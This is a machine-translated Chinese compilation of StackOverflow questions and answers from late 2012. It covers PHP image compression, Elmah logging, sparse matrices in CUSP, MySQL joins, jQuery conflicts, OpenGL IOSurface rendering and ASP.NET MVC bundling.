# StackOverflow 问答 14097000-14097999

# php - php png 图像质量 50%

> ID：14097001
> 
> 赞同：0
> 
> 时间：2012-12-31T03:08:20.483
> 
> 标签：php, image-processing

我有一个 php 脚本，用于将上传的图像转换为质量的一半，这样我可以节省服务器空间，但它不起作用我是 PHP 新手，所以希望有人可以帮助我解决我的问题。

```
if(isset($_FILES['t1']['name'])){
    $file = rand(0, 10000000).$_FILES['t1']['name'];
    if (move_uploaded_file($_FILES['t1']['tmp_name'], $file)) {
        if($fp = fopen($file,"rb", 0))
        {
           $picture = fread($fp,filesize($file));
           fclose($fp);
           $img = imagecreatefrompng($file);
           imagepng($img, $file, 6); //6 quality setting
           imagedestroy($img);
           $tag1 = '<img src="'.$file.'" alt="" class="default" />';
//unlink($file);
echo "<script>$(document).ready(function() {var write = $('.item:nth-child(1)').html();localStorage.item1Pantry = write;});</script>";      
        }
    }

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T03:10:06.270

PNG是无损压缩。当您将“质量”设置为 6 时，您实际上只是在使用平庸的压缩方法，可能会占用更多空间。使用 9 进行最高压缩（以稍微多一点的 CPU 使用为代价，除非您正在执行批处理，否则几乎不会注意到）。

您还可以查看[Yahoo! 的图像压缩](http://www.smushit.com/)，以获得更多无损优化。

此外，您真的不应该允许用户指定文件名，即使是部分指定。如果有人上传，你不会太高兴`remote_control_script.php`。永远不要相信用户上传的内容。

# asp.net-mvc - 关于Elmah的一些问题

> ID：14097002
> 
> 赞同：1
> 
> 时间：2012-12-31T03:08:26.210
> 
> 标签：asp.net-mvc, model-view-controller, elmah

我目前正在与 Elmah 合作，非常喜欢它。不过，我有几个问题：

当我记录异常时，有什么方法可以将自定义数据添加到异常记录中，该异常记录将与异常一起记录？

当我的网站上发生错误时，我希望能够将用户重定向到错误页面，并让它包含一个唯一标识符，该标识符与异常一起记录但也显示在屏幕上，以便我可以追踪它当用户报告它时。这可能吗？

是否有任何说明可以告诉我我可以将异常记录设置到磁盘？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T12:03:38.563

您可以将任何异常添加到数据集合中。您可以在 try catch 块、Global.asax 中的 Application_Error 处理程序或已注册的 HandleErrorAttribute 中执行此操作。

```
exception.Data.Add("key", "additional info"); 
```

您可以使用 Elmah 的配置登录到文件。确保您已为此位置设置用户权限。

```
<elmah>
<security allowRemoteAccess="yes" />
<errorLog type="Elmah.XmlFileErrorLog, Elmah" logPath="~/ErrorLogs" />
</elmah> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T11:54:37.000

您可以使用请求/响应模式。如果用户得到异常设置响应为 false，则使用 E​​lmah 记录错误并将具有唯一错误 ID 的错误消息返回给最终用户。您可以在下面看到代码示例：

```
public class Response
{
    public string Message { get; set; }
    public bool Success { get; set; }
}

public class ErrorLog
{
    public static string GenerateErrorRefMessageAndLog(Exception exception)
    {
        string uniqueId = Guid.NewGuid().ToString();
        Exception newEx = new Exception(uniqueId, exception);
        Elmah.ErrorSignal.FromCurrentContext().Raise(newEx);
        return String.Format("If you wish to contact us please quote reference '{0}'", uniqueId); 
    }
}

public class YourClass
{
    var response = new Response();

    try
    {
      //Bussines logic here
      response.Success = true;
    }
    catch (Exception ex)
    {
        // Shield Exceptions
        response.Message = ErrorLog.GenerateErrorRefMessageAndLog(ex);
        response.Success = false;
    }            
    return response;
} 
```

这是如何配置 Elmah 的 url。 [http://www.asp.net/web-forms/tutorials/deployment/deploying-web-site-projects/logging-error-details-with-elmah-cs](http://www.asp.net/web-forms/tutorials/deployment/deploying-web-site-projects/logging-error-details-with-elmah-cs)

# javascript - TypeScript XAML 框架

> ID：14097003
> 
> 赞同：9
> 
> 时间：2012-12-31T03:08:30.543
> 
> 标签：javascript, .net, xaml, ria, typescript

作为 .NET/XAML 开发人员，我想知道是否有人已经开始编写一个框架来替代 Silverlight 和 Flex，使用 TypeScript 和 XAML 等技术来生成 HTML5、JavaScript 和 CSS 跨平台桌面应用程序或 RIA。

如果不是，那么拥有一个理解 XAML（或只是 XML）的框架来定义用户界面和 JavaScript 或更好的 TypeScript 来编写视图控制器不是很好吗？

我知道，[Sencha](http://www.sencha.com)在构建一个名为 EXT JS 的 JavaScript 框架来构建富互联网或桌面应用程序方面做得很好，但从 .NET 开发人员的角度来看，EXT JS 很糟糕。
.NET 开发人员喜欢使用 Blend 或 Visual Studio 等工具来设计 UI，这些工具能够破解 XAML 中的代码，而不是 JSON 中的代码。

还有一种称为[Zebra](http://www.lw-zone.org)的好方法，它完全在 html-canvas 内呈现，但它不是基于 XAML 的，根本无法使用主题。

从 HTML 开发人员的角度来看，jQuery UI 和 jQuery Mobile 也是很棒的框架，但我正在寻找一个基于 XAML 的框架，因为你必须在 XAML 中编写比在 HTML 中更少的代码。还可以使用 Blend 来设计 UI。

几个月前，当 Adob​​e 放弃 Flex 而微软不承认扩展 Silverlight 5 时，我问过自己这个问题，我回答说：
微软或 Adob​​e 应该为我们做这件事。

但今天我认为现在取决于我们。

根据您的反馈，我想启动这样一个框架作为一个开源项目，但我希望还有一个在路上^^

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-02T11:04:24.107

您真的不需要 XAML 来编写 HTML 应用程序，因为 XAML 实际上只是另一种标记。

根据您的 WPF/Silverlight 经验，您会发现以下概念实际上是从 HTML 中借用的：

*   XAML 是内容的标记，这就是 HTML
*   资源是样式和行为，这就是 CSS

有些部分实际上并不直接映射，例如，您的 WPF 程序中的某些触发器可能是 Web 应用程序中的 CSS 或 JavaScript。此外，在 HTML 中使用的属性比我在 WPF 中看到的要少 - 通常所有尺寸和布局都放在 CSS 中，而不是标记中的属性。

您可能无法直接替换每个可用的 WPF 控件，但您会发现大多数事情都是可能的。

尽管如果您没有广泛使用 HTML、CSS 和 JavaScript，学习它们会涉及到学习曲线，但它们是您工具带中的有用工具。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-05-29T12:41:05.057

如果我错了，请纠正我，但我相信您正在寻找[http://fayde.wsick.com](http://fayde.wsick.com)。我正在重建 Typescript 中的框架。[在http://faydeproject.blogspot.com/](http://faydeproject.blogspot.com/)查看我的博客。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-01-03T13:16:49.223

还有基于 XAML 的 rAppid:Js [http://www.rappidjs.com](http://www.rappidjs.com)，但它不适用于 Visual Studio 或 Expression blend。

用于 HTML/JS 的 XAML 框架是一个绝妙的主意，XAML 文件可以在 HTML5 或 JavaScript 中直接通过实例化所有对象的 InitializeComponents() 方法进行转换（如在 WinForms 中）。

如果您决定开始这样的项目，请考虑使用像 Saltarelle 或 Script# 这样的 C# 到 JavaScript 编译器。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-09-09T08:33:43.263

在网上搜索“M&P H5J 是 HTML5 中的 Silverlight”，它在 TypeScript 中实现了 XAML 处理器。

# c - 将矩阵 A 转换为稀疏格式 CSR、COO 等

> ID：14097004
> 
> 赞同：1
> 
> 时间：2012-12-31T03:08:31.370
> 
> 标签：c, sparse-matrix, cusp-library

我有一个小问题，我想将矩阵 10*10 转换为[**CSR**](http://docs.cusp-library.googlecode.com/hg/classcusp_1_1csr__matrix.html#_details)或[**COO**](http://docs.cusp-library.googlecode.com/hg/classcusp_1_1coo__matrix.html#_details)稀疏矩阵/格式。矩阵是：

```
 1.00  0.00  0.00  0.00  0.00  0.00  0.00  0.00  0.00  0.00
-0.45  0.10 -0.45  0.00  0.00  0.00  0.00  0.00  0.00  0.00
 0.00 -0.45  0.10 -0.45  0.00  0.00  0.00  0.00  0.00  0.00
 0.00  0.00 -0.45  0.10 -0.45  0.00  0.00  0.00  0.00  0.00
 0.00  0.00  0.00 -0.45  0.10 -0.45  0.00  0.00  0.00  0.00
 0.00  0.00  0.00  0.00 -0.45  0.10 -0.45  0.00  0.00  0.00
 0.00  0.00  0.00  0.00  0.00 -0.45  0.10 -0.45  0.00  0.00
 0.00  0.00  0.00  0.00  0.00  0.00 -0.45  0.10 -0.45  0.00
 0.00  0.00  0.00  0.00  0.00  0.00  0.00 -0.45  0.10 -0.45
 0.00  0.00  0.00  0.00  0.00  0.00  0.00  0.00  0.00  1.00 
```

我正在使用[“CUSP”](http://code.google.com/p/cusp-library/)功能，但它不起作用，一旦矩阵**A**我只想转换为其他格式。*你能帮助我吗？*

那么我也想使用这个矩阵来解决系统**Ax=b**，使用[bicgstab](http://docs.cusp-library.googlecode.com/hg/group__krylov__methods.html)：

```
b=
   0.00000
   0.34202
   0.64279
   0.86603
   0.98481
   0.98481
   0.86603
   0.64279
   0.34202
   0.00000 
```

我的代码是：

```
int n = 10, r;

cusp::coo_matrix<int,float,cusp::device_memory> A(n, n, 3*n - 4);
cusp::array1d<float, cusp::device_memory> x(A.num_rows, 0);
cusp::array1d<float, cusp::device_memory> b(A.num_rows, 1);

   b[0]=0.00000;
   b[1]=0.34202;
   b[2]=0.64279;
   b[3]=0.86603;
   b[4]=0.98481;
   b[5]=0.98481;
   b[6]=0.86603;
   b[7]=0.64279;
   b[8]=0.34202;
   b[9]=0.00000;

i=0;
// row 0
A.row_indices[i] = 0.0;
A.column_indices[i] = 0.0;
A.values[i] = 1.00;

++i;
// rows 1 through n - 2
for (r = 1; r != n - 1; ++r) {
  A.row_indices[i] = r;
  A.column_indices[i] = r - 1;
  A.values[i] = -0.45;
  ++i;
  A.row_indices[i] = r;
  A.column_indices[i] = r;
  A.values[i] = 0.10;
  ++i;
  A.row_indices[i] = r;
  A.column_indices[i] = r + 1;
  A.values[i] = -0.45;
  ++i;
}
// row n - 1
A.row_indices[i] = n - 1;
A.column_indices[i] = n - 1;
A.values[i] = 1.00;
++i;

// set stopping criteria:
//  iteration_limit    = 100
//  relative_tolerance = 1e-3
    cusp::verbose_monitor<ValueType> monitor(b, 100, 1e-3);

// set preconditioner (identity)
cusp::identity_operator<ValueType, MemorySpace> M(A.num_rows, A.num_rows);

// solve the linear system A x = b
cusp::krylov::bicgstab(A, x, b, monitor, M);

cusp::print(x); 
```

使用 Octave 的结果应该类似于：

```
 0.00000
   0.32441
   0.60970
   0.82144
   0.93411
   0.93411
   0.82144
   0.60970
   0.32441
   0.00000 
```

但也有负数，所以**WRONG**。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T06:42:23.430

对于 COO，您必须为每个条目设置三个数组元素：行和列索引以及值。[您可以使用这样的代码为COO](https://github.com/cusplibrary/cusplibrary/blob/develop/examples/MatrixFormats/coo.cu)创建一个与您描述的矩阵类似的矩阵：

```
int n = 10, i = 0, r;
cusp::csr_matrix<int,float,cusp::host_memory> A(n, n, 3*n - 4);
// row 0
A.row_indices[i] = 0;
A.column_indices[i] = 0;
A.values[i] = 1.00;
++i;
// rows 1 through n - 2
for (r = 1; r != n - 1; ++r) {
  A.row_indices[i] = r;
  A.column_indices[i] = r - 1;
  A.values[i] = -0.45;
  ++i;
  A.row_indices[i] = r;
  A.column_indices[i] = r;
  A.values[i] = 0.10;
  ++i;
  A.row_indices[i] = r;
  A.column_indices[i] = r + 1;
  A.values[i] = -0.45;
  ++i;
}
// row n - 1
A.row_indices[i] = n - 1;
A.column_indices[i] = n - 1;
A.values[i] = 1.00;
++i; 
```

对于 CSR，您必须为每个条目指定一列和一个值，还必须为每一行指定第一个条目的索引，包括最后一行的过去索引。[CSR](https://github.com/cusplibrary/cusplibrary/blob/develop/examples/MatrixFormats/csr.cu)的类似代码：

```
int n = 10, i = 0, r = 0;
cusp::csr_matrix<int,float,cusp::host_memory> A(n, n, 3*n - 4);
// row 0
A.row_offsets[r] = i;
A.column_indices[i] = 0;
A.values[i] = 1.00;
++i;
// rows 1 through n - 2
for (++r; r != n - 1; ++r) {
  A.row_offsets[r] = i;
  A.column_indices[i] = r - 1;
  A.values[i] = -0.45;
  ++i;
  A.column_indices[i] = r;
  A.values[i] = 0.10;
  ++i;
  A.column_indices[i] = r + 1;
  A.values[i] = -0.45;
  ++i;
}
// row n - 1
A.row_offsets[r] = i;
A.column_indices[i] = r;
A.values[i] = 1.00;
++i;
++r;
A.row_offsets[r] = i; 
```

要从其他格式“转换”矩阵，您必须让我们知道您的原始数据以何种形式存储。从 a 转换[`cusp::array2d`](http://cusplibrary.github.io/classcusp_1_1array2d.html)应该通过简单地将数组传递给构造函数来工作。一般来说，首先像上面的代码那样以稀疏格式创建矩阵将提供更好的可伸缩性。

另请注意，您的示例矩阵排列在对角带中，因此[`cusp::dia_matrix`](http://cusplibrary.github.io/classcusp_1_1dia__matrix.html)在易于编码和更好的性能方面都更适合。要创建这样的三对角矩阵，可以使用以下代码：

```
int n = 10, r = 0;
cusp::dia_matrix<int,float,cusp::host_memory> A(n, n, 3*n - 4, 3);
A.diagonal_offsets[0] = -1;
A.diagonal_offsets[1] = 0;
A.diagonal_offsets[2] = 1;
// row 0
A.values(r,0) = A.values(r,2) = 0.00;
A.values(r,1) = 1.00;
// rows 1 through n - 2
for (++r; r != n - 1; ++r) {
  A.values(r,0) = A.values(r,2) = -0.45;
  A.values(r,1) = 0.10;
}
// row n - 1
A.values(r,0) = A.values(r,2) = 0.00;
A.values(r,1) = 1.00; 
```

关于您尝试解决的这个线性方程：八度音程是否在与您粘贴到问题中的矩阵不同的矩阵上运行？因为使用[sage](http://www.sagemath.org/)我也会在结果中得到负数：

```
n = 10
d = dict()
d[(0,0)] = d[(n-1, n-1)] = 1
for r in range(1, n-1):
    d[(r, r-1)] = d[(r, r+1)] = -45/100
    d[(r,r)] = 1/10
A = matrix(RDF, n, n, d)
b = vector(RDF, [
   0.00000,
   0.34202,
   0.64279,
   0.86603,
   0.98481,
   0.98481,
   0.86603,
   0.64279,
   0.34202,
   0.00000,
   ])
for i in A.solve_right(b):
    print('{:+.5f}'.format(float(i))) 
```

给出以下向量*x*：

```
+0.00000
-0.45865
-0.86197
-1.16132
-1.32062
-1.32062
-1.16132
-0.86197
-0.45865
+0.00000 
```

# mysql - 连接来自 2 个表的字段

> ID：14097005
> 
> 赞同：0
> 
> 时间：2012-12-31T03:08:31.730
> 
> 标签：mysql, join

我有 2 张桌子：

```
table 'g'
+------+
| id   |
+------+
|    1 |
|   32 |
|    3 |
|    6 |
|    5 |
|   22 |
|   54 |
|   21 |
+------+

table 'h'
+------+------+
| id   | sl   |
+------+------+
|    1 |  323 |
|   11 |  423 |
|    1 |  333 |
|   33 |   32 |
|   44 |  443 |
+------+------+ 
```

如何显示来自 2 个表的记录，例如（从“g”和“h”表中选择不同的 id，并为每个 id 从“h”表中加入最大“sl”。“g”表的“id”不匹配表“h”的“id”，那些“sl”字段将为空）

```
+------+------+
| id   | sl   |
+------+------+
|    1 |  333 |
|   32 | null |
|    3 | null |
|    6 | null |
|    5 | null |
|   22 | null |
|   54 | null |
|   21 | null |
|   11 |  423 |
|   33 |   32 |
|   44 |  443 |
+------+------+ 
```

-谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T03:11:33.310

这可以通过`UNION`两者之间的 a 来完成，作为派生表左连接`h`以获取`MAX()`值：

```
SELECT
  allids.id,
  MAX(sl) AS sl
FROM
  /* Subquery gets UNION (distinct, not UNION ALL) of ids from both tables */
  (SELECT id FROM g UNION SELECT id FROM h) allids
  /* LEFT JOINed back against `h` for the MAX() aggregates */
  LEFT JOIN h ON allids.id = h.id
GROUP BY id 
```

[http://sqlfiddle.com/#!2/2c348/3](http://sqlfiddle.com/#!2/2c348/3)

### 评论后更新：

为了强制它们以插入的任意（无序）顺序进行排序，将数字文字放入子查询中可能会有所帮助，该子查询在`ORDER BY`.

但是，插入的订单行对 RDBMS 并没有真正意义。您不能可靠地假设它们总是以相同的顺序返回给您，没有`ORDER BY`条款。

```
SELECT
  allids.id,
  MAX(sl) AS sl
FROM
  /* Awful hack adds a number literal which is used in the ORDER BY */
  /* This still won't guarantee that the rows from each table will be in the original order though */
  (SELECT id, 1 AS sort FROM g UNION SELECT id, 2 AS sort FROM h) allids
  LEFT JOIN h ON allids.id = h.id
GROUP BY id
ORDER BY sort 
```

[http://sqlfiddle.com/#!2/2c348/6](http://sqlfiddle.com/#!2/2c348/6)

# jquery - Jquery在一起时发生冲突，但独立工作

> ID：14097006
> 
> 赞同：0
> 
> 时间：2012-12-31T03:08:47.457
> 
> 标签：jquery, scroll

这两个脚本独立工作，但一起使用时会发生冲突。任何帮助，将不胜感激。

```
<!-- scroll-box ================================================== -->
<script type="text/javascript" src="script/jquery.js"></script>
<script type="text/javascript" src="script/ui.core.js"></script>
<script type="text/javascript" src="script/jquery.scroll-follow.js"></script>

<script type="text/javascript">
    $( document ).ready( function () {
        $( '#box-scroll' ).scrollFollow();
    });
</script>

<!-- button================================================== -->
<script src="http://code.jquery.com/jquery-1.8.3.js"></script>
<script src="http://code.jquery.com/ui/1.9.2/jquery-ui.js"></script>
<script>
$(function() {
    $( "#check" ).button();
    $( ".category" ).buttonset();
});
</script> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T03:11:54.487

问题非常简单。页面中只需要一个 jQuery 实例。当您加载第二个版本时，它会覆盖整个 jQuery 对象并清除所有注册到原始版本的插件

在任何插件或依赖代码之前加载 jQuery。

另外......加载jQueryUI核心没有意义......然后加载完整版本。根据您的需要选择一个或另一个

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T03:23:34.647

jQuery 为这个问题提供了解决方案。

```
<script src="http://code.jquery.com/jquery-1.8.3.js"></script>
<script>
    myJQ = $.noConflict();
</script>
<script>
    // You should use `myJQ()` instead of `$()` from now on to use the second included jQuery:
    myJQ("#div").html("Hello!");
</script> 
```

# jquery - 在 jQuery 中停止 XHR 请求

> ID：14097009
> 
> 赞同：0
> 
> 时间：2012-12-31T03:09:26.333
> 
> 标签：jquery, function, execution

刷新页面时是否可以停止以下代码的请求/响应超时？

```
 setInterval(function(){
    var xhr = $.ajax({
    url:'/ajax_controller/searchForTracks/'+logged_user_id,
    success: function(data){
        console.log(data+' tracks added');
            }
        });
    },5000); 
```

我努力了：

```
 $(window).unload(function(){
            xhr.abort();
        }); 
```

和

```
 window.onbeforeunload = function(){
      throw new error('Aborting javascript');
   } 
```

但没什么对我有用。我只想立即刷新页面，而不是等到我的 URL 上的 xhr 请求完成（因为有时需要几分钟）；

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-09-05T17:33:17.430

我认为问题出在这里：

```
setInterval(function(){
    var xhr = $.ajax({...   <---
},5000); 
```

您正在初始化回调函数内部的变量，您所要做的就是：

```
var xhr;
setInterval(function(){
    xhr = $.ajax({...
},5000); 
```

然后你可以做

```
console.log(xhr); // Object... 
```

我也建议缓存 setInterval 这样你就可以做到

```
var myInterval =     setInterval(function(){
        xhr = $.ajax({...
    },5000); 
```

如果您需要取消间隔，只需执行

```
clearTimeout(myInterval); 
```

TLDR：这是一个范围问题。

# objective-c - 将 IOSurface 绘制到另一个 IOSurface

> ID：14097015
> 
> 赞同：2
> 
> 时间：2012-12-31T03:11:12.173
> 
> 标签：objective-c, xcode, opengl

如何将一系列 IOSurfaces 绘制到另一个然后将其绘制到屏幕上？我在 MultiGPU 示例项目中使用了来自苹果的一些源代码，但我设法做的最好的事情是绘制一个白屏或获取大量伪影并使应用程序崩溃。

我对 openGL 很陌生，我不太了解帧缓冲区和纹理的绑定以及它们如何与 IOSurfaces 交互。

这就是我必须从 IOSurface 创建纹理（直接来自 Apple 的来源）

```
// Create an IOSurface backed texture
// Create an FBO using the name of this texture and bind the texture to the color attachment of the FBO
- (GLuint)setupIOSurfaceTexture:(IOSurfaceRef)ioSurfaceBuffer {
    GLuint name;
    CGLContextObj cgl_ctx = (CGLContextObj)[[self openGLContext] CGLContextObj];

    glGenTextures(1, &name);

    glBindTexture(GL_TEXTURE_RECTANGLE_EXT, name);
    CGLTexImageIOSurface2D(cgl_ctx, GL_TEXTURE_RECTANGLE_EXT, GL_RGBA, 512, 512, GL_BGRA, GL_UNSIGNED_INT_8_8_8_8_REV,
                ioSurfaceBuffer, 0);
    glTexParameteri(GL_TEXTURE_RECTANGLE_EXT, GL_TEXTURE_MIN_FILTER, GL_LINEAR);
    glTexParameteri(GL_TEXTURE_RECTANGLE_EXT, GL_TEXTURE_MAG_FILTER, GL_LINEAR);
    glTexParameteri(GL_TEXTURE_RECTANGLE_EXT, GL_TEXTURE_WRAP_S, GL_CLAMP_TO_EDGE);
    glTexParameteri(GL_TEXTURE_RECTANGLE_EXT, GL_TEXTURE_WRAP_T, GL_CLAMP_TO_EDGE); 

    // Generate an FBO using the same name with the same texture bound to it as a render target.

    glBindTexture(GL_TEXTURE_RECTANGLE_EXT, 0);

    glBindFramebufferEXT(GL_FRAMEBUFFER_EXT, name);
    glFramebufferTexture2DEXT(GL_FRAMEBUFFER_EXT, GL_COLOR_ATTACHMENT0_EXT, GL_TEXTURE_RECTANGLE_EXT, name, 0);

    if(!_depthBufferName) {
        glGenRenderbuffersEXT(1, &_depthBufferName);
        glRenderbufferStorageEXT(GL_TEXTURE_RECTANGLE_EXT, GL_DEPTH, 512, 512);
    }
    glFramebufferRenderbufferEXT(GL_FRAMEBUFFER_EXT, GL_DEPTH_ATTACHMENT_EXT, GL_TEXTURE_RECTANGLE_EXT, _depthBufferName);

    glBindFramebufferEXT(GL_FRAMEBUFFER_EXT, 0);

    return name;
} 
```

我有这段代码可以将表面绘制到屏幕上。（也来自苹果的来源）

```
// Fill the view with the IOSurface backed texture 
- (void)textureFromCurrentIOSurface {
    NSRect bounds = [self bounds];
    CGLContextObj cgl_ctx = (CGLContextObj)[[self openGLContext] CGLContextObj];

    // Render quad from our iosurface texture
    glViewport(0, 0, (GLint)bounds.size.width, (GLint)bounds.size.height);

    glMatrixMode(GL_PROJECTION);
    glLoadIdentity();   
    glOrtho(0.0, (GLfloat)bounds.size.width, 0.0f, (GLfloat)bounds.size.height, -1.0f, 1.0f);

    glMatrixMode(GL_MODELVIEW);
    glLoadIdentity();

    glClearColor(0.0f, 0.0f, 0.0f, 0.0f);
    glClear(GL_COLOR_BUFFER_BIT);

    glBindTexture(GL_TEXTURE_RECTANGLE_EXT, [[NSApp delegate] currentTextureName]); // Grab the texture from the delegate
    glEnable(GL_TEXTURE_RECTANGLE_EXT);
    glTexEnvi(GL_TEXTURE_RECTANGLE_EXT, GL_TEXTURE_ENV_MODE, GL_REPLACE);

    glBegin(GL_QUADS);
    glColor4f(1.0f, 1.0f, 1.0f, 1.0f);

    glTexCoord2f(0.0f, 0.0f);
    glVertex2f(0.0f, 0.0f);

    glTexCoord2f(512.0f, 0.0f);
    glVertex2f((GLfloat)bounds.size.width, 0.0f);

    glTexCoord2f(512.0f, 512.0f);
    glVertex2f((GLfloat)bounds.size.width, (GLfloat)bounds.size.height);

    glTexCoord2f(0.0f, 512.0f);
    glVertex2f(0.0f, (GLfloat)bounds.size.height);

    glEnd();

    glDisable(GL_TEXTURE_RECTANGLE_EXT);
} 
```

将单个 IOSurface 绘制到屏幕上可以正常工作。将 IOSurface 绘制到另一个我缺少什么？

假设我有纹理 A、B、C 和 DI 想要：

- 在特定区域中将 A 绘制到 C
上， - 在不同区域中将 B 绘制到 C 上（可能与 A 重叠）， - 将 C 绘制
到屏幕上。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-25T05:36:15.240

我使用以下代码解决了这个问题，但是在绘制之前缩放 IOSurface 存在一些小问题。

```
- (void)renderIOSurface:(IOSurfaceRef)surface toBuffer:(GLuint)buffer atPoint:(CGPoint)point withSize:(CGSize)size {
CGLContextObj cgl_ctx = (CGLContextObj)[[self openGLContext] CGLContextObj];

// Bind framebuffer
glBindFramebufferEXT(GL_FRAMEBUFFER_EXT, buffer);

glViewport(0, 0, TEXWIDE, TEXHIGH);
glMatrixMode(GL_PROJECTION);
glPushMatrix();
glLoadIdentity();
glOrtho(0.0, TEXWIDE, 0.0, TEXHIGH, -1, 1);
glMatrixMode(GL_MODELVIEW);
glPushMatrix();
glLoadIdentity();

GLsizei sH  = (GLsizei)IOSurfaceGetHeight(surface);
GLsizei sW   = (GLsizei)IOSurfaceGetWidth(surface);

// Create texture
GLuint name;
glGenTextures(1, &name);
glEnable(GL_TEXTURE_RECTANGLE_EXT);
glBindTexture(GL_TEXTURE_RECTANGLE_EXT, name);
CGLTexImageIOSurface2D(cgl_ctx, GL_TEXTURE_RECTANGLE_EXT, GL_RGBA, sW, sH, GL_BGRA, GL_UNSIGNED_INT_8_8_8_8_REV, surface, 0);
glTexParameteri(GL_TEXTURE_RECTANGLE_EXT, GL_TEXTURE_MIN_FILTER, GL_LINEAR);
glTexParameteri(GL_TEXTURE_RECTANGLE_EXT, GL_TEXTURE_MAG_FILTER, GL_LINEAR);
//  glTexParameteri(GL_TEXTURE_RECTANGLE_EXT, GL_TEXTURE_WRAP_S, GL_CLAMP_TO_EDGE);
//  glTexParameteri(GL_TEXTURE_RECTANGLE_EXT, GL_TEXTURE_WRAP_T, GL_CLAMP_TO_EDGE);

glBindTexture(GL_TEXTURE_RECTANGLE_EXT, 0);

//glDisable(GL_BLEND);

glBindTexture(GL_TEXTURE_RECTANGLE_EXT, name);
    glTexParameteri(GL_TEXTURE_RECTANGLE_EXT, GL_TEXTURE_MIN_FILTER, GL_LINEAR);
    glTexParameteri(GL_TEXTURE_RECTANGLE_EXT, GL_TEXTURE_MAG_FILTER, GL_LINEAR);
glTexEnvf(GL_TEXTURE_ENV, GL_TEXTURE_ENV_MODE, GL_REPLACE);

glBegin(GL_QUADS);
glColor4f(1.0f, 1.0f, 1.0f, 1.0f);

glTexCoord2f(0.0f, 0.0f);
glVertex2f(point.x, point.y);

glTexCoord2f(sW, 0.0f);
glVertex2f(point.x + size.width, point.y);

glTexCoord2f(sW, sH);
glVertex2f(point.x + size.width, point.y + size.height);

glTexCoord2f(0.0f, sH);
glVertex2f(point.x, point.y + size.height);

glEnd();

//glDisable(GL_TEXTURE_RECTANGLE_EXT);

// Bindback to normal
glBindTexture(GL_TEXTURE_RECTANGLE_EXT, 0);
glBindFramebufferEXT(GL_FRAMEBUFFER_EXT, 0);

// Delete the name texture
glDeleteTextures(1, &name);

//  [[self openGLContext] flushBuffer];
// This flush is necessary to ensure proper behavior if the MT engine is enabled.
//  glFlush();
glMatrixMode(GL_MODELVIEW);
glPopMatrix();
glMatrixMode(GL_PROJECTION);
glPopMatrix();
glFlush();
} 
```

# javascript - Javascript - CSS，点击可见性

> ID：14097018
> 
> 赞同：0
> 
> 时间：2012-12-31T03:11:44.293
> 
> 标签：javascript, css, visibility

我对 Javascript 很陌生。我一直在研究使用 Javascript 来编辑 CSS 样式属性。我在网上搜索并查看了很多不同的问题。即使有了所有这些，对于为什么我无法弄清楚我的代码有什么问题，这可能是我的经验不足。增加问题的是，有很多方法可以做到这一点。无论如何，这里是细节。

**我想要它做什么：** 当有人点击代码中的链接时，我希望隐藏的 DIV（它就在我等待被调用的顶部附近）将其可见性切换为可见，以便创建一个页面上的新图层。

**我的代码：**

```
<html>
    <head>
        <script language="javascript">
            function newwindow() {
                var showme = document.getelementbyid("testing");
                showme.style.visibility = "visible";
            }
        </script>
    </head>
    <body>
        <a href="#" onclick="newwindow()">Show me my hidden layer</a>
        <div id="testing" style="position: absolute; visibility: hidden; left: 50%; top: 50%;
    border: 1px solid darkblue; width: 400px; height: 300px; line-height: 300px;     
    text-align: center; vertical-align: middle;
    margin-top: -150px; margin-left: -200px; background: lightgray">HELLO!!!</div>
    </body>
</html> 
```

现在，我知道有很多方法可以做到这一点。但是有人可以告诉我在我给出的代码中需要调整什么来使我编写这个工作的方式吗？非常感谢您的宝贵时间。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-31T03:16:51.573

它`document.getElementById`不是`document.getelementbyid`

[工作演示](http://jsbin.com/ecixeh/1/edit)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-31T03:46:23.420

使用此代码

```
 <html>
        <head>
            <script language="javascript">
                function newwindow() {
                    var showme = document.getElementById("testing");
                    showme.style.visibility = "visible";
                }
            </script>
        </head>
        <body>
            <a href="#" onclick="newwindow()">Show me my hidden layer</a>
            <div id="testing" style="position: absolute; visibility: hidden; left: 50%; top: 50%;
        border: 1px solid darkblue; width: 400px; height: 300px; line-height: 300px;     
        text-align: center; vertical-align: middle;
        margin-top: -150px; margin-left: -200px; background: lightgray">HELLO!!!</div>
        </body>
    </html> 
```

# asp.net-mvc - mvc 捆绑，每个视图一个

> ID：14097021
> 
> 赞同：3
> 
> 时间：2012-12-31T03:12:09.357
> 
> 标签：asp.net-mvc, asp.net-mvc-4, bundling-and-minification

我正在使用 mvc4 并探索 css 和 javascript 的捆绑是如何工作的。我有一个需要帮助的问题。

对于我呈现的每一页（视图），我只想拥有一个 js 和 css 文件。这是该视图所需的多个文件的结果。从我所见，我可以创建文件包，但我没有看到为每个视图创建包的方法。

如果可以实现我概述的内容，有人可以帮助我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-02-23T04:49:59.263

What you need to do is go to Static>App_Start>BundleConfig.cs :

![Bundle Config path](../Images/64098d8ed046d782353d2a75138af1f7.png)

and then create a bundle for each view you have:

```
public class BundleConfig
{
    // For more information on Bundling, visit http://go.microsoft.com/fwlink/?LinkId=254725
    public static void RegisterBundles(BundleCollection bundles)
    {
        bundles.Add(new ScriptBundle("~/bundles/GlobalScripts")
                            .Include("~/Static/Scripts/jquery-1.10.2.js"
                                    , "~/Static/Scripts/json2.js"
                                    , "~/Static/Scripts/jquery-ui-1.10.4.js"
                                    //, "~/Static/Scripts/jquery.layout-1.3.0.js"
                                    //, "~/Static/Scripts/jquery.layout.state.js"
                                    , "~/Static/Scripts/helper.mainlayout.js"));
    }
} 
```

